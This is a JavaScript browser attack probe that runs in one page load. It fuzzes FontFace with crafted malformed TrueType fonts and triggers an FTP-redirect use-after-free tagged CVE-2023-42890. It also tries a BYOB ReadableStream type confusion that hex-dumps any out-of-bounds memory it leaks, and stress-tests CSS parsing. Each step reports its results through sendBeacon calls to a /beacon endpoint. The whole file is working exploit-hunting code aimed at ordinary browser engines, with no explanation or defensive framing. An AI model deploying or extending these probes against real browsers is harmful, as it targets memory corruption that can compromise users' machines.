// p190a — Combined probe: SVG font, FontFace fuzz, FTP UAF, BYOB Streams
// Tests ALL promising attack surfaces in one page load
// Uses POST beacons (navigator.sendBeacon) for host-beacons.log compatibility
// Beacon prefix: V190A-

(function() {
  function B(tag, body) {
    try {
      navigator.sendBeacon('/beacon/V190A-' + tag + '?t=' + Date.now(), body || '');
    } catch(e) {
      try { new Image().src = '/beacon/V190A-' + tag + '&t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var queue = [];
  var phase = 0;

  function nextPhase() {
    phase++;
    var fn = phases[phase - 1];
    if (fn) {
      try { fn(); } catch(e) { B('PHASE' + phase + '-ERR', String(e).substring(0, 80)); nextPhase(); }
    } else {
      B('ALL-DONE', phase + ' phases');
    }
  }

  var phases = [testSVGFont, testFontFace, testFTP, testBYOB, testCSS];

  // ==================== PHASE 1: SVG Font Support ====================
  function testSVGFont() {
    B('P1-SVG-FONT');

    var svgNS = 'http://www.w3.org/2000/svg';
    var fontEl = document.createElementNS(svgNS, 'font');
    B('P1-CTOR', fontEl.constructor.name || Object.prototype.toString.call(fontEl));

    // Create inline SVG font
    var svg = document.createElementNS(svgNS, 'svg');
    svg.setAttribute('width', '0');
    svg.setAttribute('height', '0');

    fontEl.setAttribute('horiz-adv-x', '500');
    var ff = document.createElementNS(svgNS, 'font-face');
    ff.setAttribute('font-family', 'SVGTest');
    ff.setAttribute('units-per-em', '1000');
    fontEl.appendChild(ff);

    var mg = document.createElementNS(svgNS, 'missing-glyph');
    mg.setAttribute('d', 'M0 0L500 0L500 800L0 800Z');
    fontEl.appendChild(mg);

    for (var i = 0; i < 10; i++) {
      var g = document.createElementNS(svgNS, 'glyph');
      g.setAttribute('unicode', String.fromCharCode(0x41 + i));
      g.setAttribute('horiz-adv-x', '500');
      g.setAttribute('d', 'M100 0L400 0L400 700L100 700Z');
      fontEl.appendChild(g);
    }

    var defs = document.createElementNS(svgNS, 'defs');
    defs.appendChild(fontEl);
    svg.appendChild(defs);
    document.body.appendChild(svg);

    // SVG text using the font
    var txt = document.createElementNS(svgNS, 'text');
    txt.setAttribute('font-family', 'SVGTest');
    txt.setAttribute('font-size', '48');
    txt.textContent = 'ABCDE';
    svg.setAttribute('width', '400');
    svg.setAttribute('height', '100');
    svg.appendChild(txt);

    var bbox = txt.getBBox ? txt.getBBox() : null;
    B('P1-BBOX', bbox ? Math.round(bbox.width) + 'x' + Math.round(bbox.height) : 'none');
    B('P1-CHILDNODES', fontEl.childNodes.length + '');

    setTimeout(nextPhase, 100);
  }

  // ==================== PHASE 2: FontFace API Fuzzing ====================
  function testFontFace() {
    B('P2-FONTFACE');

    if (typeof FontFace === 'undefined') { B('P2-NO-API'); nextPhase(); return; }
    B('P2-API-OK');

    function push16(arr, val) { arr.push((val >> 8) & 0xFF, val & 0xFF); }
    function push32(arr, val) { arr.push((val >> 24) & 0xFF, (val >> 16) & 0xFF, (val >> 8) & 0xFF, val & 0xFF); }
    function tag2u32(s) { return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) | (s.charCodeAt(2) << 8) | s.charCodeAt(3); }

    function buildTTF(muts) {
      var T = {};
      // head (54 bytes)
      var h = []; push32(h,0x00010000); push32(h,0x00005000); push32(h,0); push32(h,0x5F0F3CF5);
      push16(h,0x000B); push16(h,1000); for(var i=0;i<16;i++) h.push(0);
      push16(h,0); push16(h,0); push16(h,1000); push16(h,1000);
      push16(h,0); push16(h,8); push16(h,2); push16(h,1); push16(h,0); T.head = h;

      // maxp
      var m = []; push32(m,0x00010000); push16(m,2); for(var i=0;i<13;i++) push16(m,0); T.maxp = m;

      // hhea
      var hh = []; push32(hh,0x00010000); push16(hh,800); push16(hh,0xFE38); push16(hh,0);
      push16(hh,500); for(var i=0;i<9;i++) push16(hh,0); push16(hh,2); T.hhea = hh;

      // hmtx
      var hm = []; push16(hm,500); push16(hm,0); push16(hm,500); push16(hm,0); T.hmtx = hm;

      // cmap fmt4
      var cm = []; push16(cm,0); push16(cm,1); push16(cm,3); push16(cm,1); push32(cm,12);
      push16(cm,4); push16(cm,32); push16(cm,0); push16(cm,4); push16(cm,4); push16(cm,1); push16(cm,0);
      push16(cm,0x0041); push16(cm,0xFFFF); push16(cm,0); push16(cm,0x0041); push16(cm,0xFFFF);
      push16(cm,0xFFC0); push16(cm,1); push16(cm,0); push16(cm,0); T.cmap = cm;

      // loca
      var lo = []; push32(lo,0); push32(lo,0); push32(lo,0); T.loca = lo;
      T.glyf = [];

      // post
      var po = []; push32(po,0x00030000); push32(po,0); push16(po,0xFF9C); push16(po,50);
      for(var i=0;i<4;i++) push32(po,0); T.post = po;

      // name
      var na = []; push16(na,0); push16(na,4); push16(na,6+48);
      var ns = [0,70,0,117,0,122,0,122];
      for(var n=0;n<4;n++){push16(na,3);push16(na,1);push16(na,0x0409);push16(na,[1,2,4,6][n]);push16(na,ns.length);push16(na,0);}
      for(var i=0;i<ns.length;i++) na.push(ns[i]); T.name = na;

      // Assemble
      var tags = Object.keys(T).sort();
      var nt = tags.length;
      var hs = 12 + nt * 16;
      var off = hs;
      var offsets = {};
      for (var i = 0; i < nt; i++) {
        offsets[tags[i]] = off;
        off += T[tags[i]].length + ((4 - T[tags[i]].length % 4) % 4);
      }
      var buf = new ArrayBuffer(off);
      var dv = new DataView(buf);
      var u8 = new Uint8Array(buf);
      dv.setUint32(0, 0x00010000);
      dv.setUint16(4, nt);
      dv.setUint16(6, 128); dv.setUint16(8, 3); dv.setUint16(10, nt * 16 - 128);
      for (var i = 0; i < nt; i++) {
        var d = 12 + i * 16;
        dv.setUint32(d, tag2u32(tags[i]));
        dv.setUint32(d+4, 0);
        dv.setUint32(d+8, offsets[tags[i]]);
        dv.setUint32(d+12, T[tags[i]].length);
        for (var j = 0; j < T[tags[i]].length; j++) u8[offsets[tags[i]] + j] = T[tags[i]][j];
      }
      if (muts) muts(dv, u8, buf, offsets);
      return buf;
    }

    var tests = [
      ['VALID', null],
      ['MAXP-FFFF', function(dv,u8,b,o) { dv.setUint16(o.maxp+4,0xFFFF); }],
      ['HHEA-HMET-FFFF', function(dv,u8,b,o) { dv.setUint16(o.hhea+34,0xFFFF); }],
      ['LOCA-OOB', function(dv,u8,b,o) { dv.setUint32(o.loca,0x7FFFFFFF); }],
      ['HEAD-UPEM-0', function(dv,u8,b,o) { dv.setUint16(o.head+18,0); }],
      ['CMAP-BIGSEG', function(dv,u8,b,o) { dv.setUint16(o.cmap+18,0xFFFE); }],
      ['HEAD-LOCAFMT-FF', function(dv,u8,b,o) { dv.setInt16(o.head+50,0xFF); }],
      ['MAXP-0', function(dv,u8,b,o) { dv.setUint16(o.maxp+4,0); }],
      ['SFNT-OTTO', function(dv,u8,b,o) { dv.setUint32(0,0x4F54544F); }],
    ];

    var ti = 0;
    function nextT() {
      if (ti >= tests.length) { nextPhase(); return; }
      var t = tests[ti]; var idx = ti++;
      B('P2-T' + idx + '-' + t[0]);
      try {
        var buf = buildTTF(t[1]);
        var face = new FontFace('FZ' + idx, buf);
        face.load().then(function(ld) {
          B('P2-T' + idx + '-LOADED');
          document.fonts.add(ld);
          var el = document.createElement('span');
          el.style.fontFamily = 'FZ' + idx + ',serif';
          el.style.fontSize = '48px';
          el.textContent = 'ABCDE 12345';
          document.body.appendChild(el);
          void el.offsetWidth;
          try { var c = document.createElement('canvas'); c.width=200;c.height=60;
            var ctx=c.getContext('2d'); ctx.font='48px FZ'+idx; ctx.fillText('Test',10,50);
            B('P2-T' + idx + '-CANVAS-OK');
          } catch(ce) { B('P2-T' + idx + '-CANVAS-ERR', String(ce).substring(0,40)); }
          try { document.fonts.delete(ld); } catch(e) {}
          document.body.removeChild(el);
          setTimeout(nextT, 20);
        }).catch(function(e) {
          B('P2-T' + idx + '-REJECT', String(e).substring(0,50));
          setTimeout(nextT, 20);
        });
      } catch(e) {
        B('P2-T' + idx + '-ERR', String(e).substring(0,50));
        setTimeout(nextT, 20);
      }
    }
    nextT();
  }

  // ==================== PHASE 3: FTP Redirect UAF (CVE-2023-42890) ====================
  function testFTP() {
    B('P3-FTP');

    // Baseline
    fetch('/beacon/V190A-P3-NET-CHECK?t=' + Date.now())
      .then(function() {
        B('P3-NET-OK');
        // Trigger FTP redirect
        return fetch('/ftp-redir', { redirect: 'follow' });
      })
      .then(function(r) {
        B('P3-FTP-OK-' + r.status + '-' + r.type);
        return r.text().then(function(t) { B('P3-FTP-BODY', t.substring(0,40)); });
      })
      .catch(function(e) {
        B('P3-FTP-ERR', e.constructor.name + ':' + (e.message||'').substring(0,40));
      })
      .finally(function() {
        // Check if networking still works
        setTimeout(function() {
          fetch('/beacon/V190A-P3-ALIVE?t=' + Date.now())
            .then(function() { B('P3-ALIVE'); nextPhase(); })
            .catch(function() { B('P3-NET-DEAD'); nextPhase(); });
        }, 1500);
      });
  }

  // ==================== PHASE 4: BYOB Streams Type Confusion ====================
  function testBYOB() {
    B('P4-BYOB');

    if (typeof ReadableStream === 'undefined') { B('P4-NO-STREAMS'); nextPhase(); return; }

    try {
      // Test if BYOB reader is supported
      var rs = new ReadableStream({
        type: 'bytes',
        start: function(controller) {
          // Enqueue some data
          var data = new Uint8Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]);
          controller.enqueue(data);
          controller.close();
        }
      });

      var reader = rs.getReader({ mode: 'byob' });
      B('P4-BYOB-OK');

      // Test normal read first
      var view = new Uint8Array(16);
      reader.read(view).then(function(result) {
        B('P4-READ-OK', 'len=' + (result.value ? result.value.length : 'null') + ' done=' + result.done);
        B('P4-VIEW-TYPE', result.value ? result.value.constructor.name : 'null');

        // Now test with tampered view
        testTamperedBYOB();
      }).catch(function(e) {
        B('P4-READ-ERR', String(e).substring(0, 50));
        nextPhase();
      });
    } catch(e) {
      B('P4-ERR', String(e).substring(0, 50));
      nextPhase();
    }

    function testTamperedBYOB() {
      try {
        var rs2 = new ReadableStream({
          type: 'bytes',
          pull: function(controller) {
            var view = controller.byobRequest.view;
            B('P4-PULL-VIEW', view.constructor.name + ' len=' + view.byteLength);
            // Fill with recognizable pattern
            var u8 = new Uint8Array(view.buffer, view.byteOffset, view.byteLength);
            for (var i = 0; i < u8.length; i++) u8[i] = 0xAA;
            controller.byobRequest.respond(view.byteLength);
          }
        });

        var reader2 = rs2.getReader({ mode: 'byob' });

        // Create a Float64Array but override BYTES_PER_ELEMENT and constructor
        var tampered = new Float64Array(8); // 64 bytes
        // Override prototype properties
        Object.defineProperty(tampered, 'BYTES_PER_ELEMENT', { value: 1 });
        Object.defineProperty(tampered, 'constructor', { value: Uint8Array });

        B('P4-TAMPERED', 'bpe=' + tampered.BYTES_PER_ELEMENT + ' ctor=' + tampered.constructor.name);

        reader2.read(tampered).then(function(result) {
          if (result.value) {
            B('P4-TAMPERED-OK', result.value.constructor.name + ' len=' + result.value.length + ' blen=' + result.value.byteLength);
            // Check if we got more data than expected
            if (result.value.byteLength > 64) {
              B('P4-OOB-READ', result.value.byteLength + ' bytes (expected 64)');
              // Dump first 128 bytes
              var hex = '';
              var arr = new Uint8Array(result.value.buffer, result.value.byteOffset, Math.min(result.value.byteLength, 128));
              for (var i = 0; i < arr.length; i++) hex += (arr[i] < 16 ? '0' : '') + arr[i].toString(16);
              B('P4-LEAK', hex.substring(0, 200));
            }
          } else {
            B('P4-TAMPERED-NULL');
          }
          nextPhase();
        }).catch(function(e) {
          B('P4-TAMPERED-ERR', String(e).substring(0, 60));
          nextPhase();
        });
      } catch(e) {
        B('P4-TAMPER-SETUP-ERR', String(e).substring(0, 60));
        nextPhase();
      }
    }
  }

  // ==================== PHASE 5: CSS custom properties stress ====================
  function testCSS() {
    B('P5-CSS');
    try {
      // Test CSS custom properties for any parsing bugs
      var style = document.createElement('style');
      var rules = '';
      // Generate deeply nested calc expressions
      var calc = '1px';
      for (var i = 0; i < 50; i++) calc = 'calc(' + calc + ' + 1px)';
      rules += '.deepcalc { width: ' + calc + '; }\n';

      // Very long custom property
      var longVal = 'A'.repeat(65536);
      rules += '.longprop { --x: ' + longVal + '; }\n';

      // Many custom properties
      for (var i = 0; i < 1000; i++) {
        rules += '.mp' + i + ' { --v' + i + ': ' + i + 'px; }\n';
      }
      style.textContent = rules;
      document.head.appendChild(style);
      B('P5-STYLES-OK');

      var el = document.createElement('div');
      el.className = 'deepcalc';
      document.body.appendChild(el);
      var w = el.offsetWidth;
      B('P5-CALC-WIDTH', w + 'px');

      document.body.removeChild(el);
      document.head.removeChild(style);
    } catch(e) {
      B('P5-ERR', String(e).substring(0, 60));
    }
    B('P5-DONE');
    nextPhase();
  }

  // Start
  setTimeout(nextPhase, 50);
})();
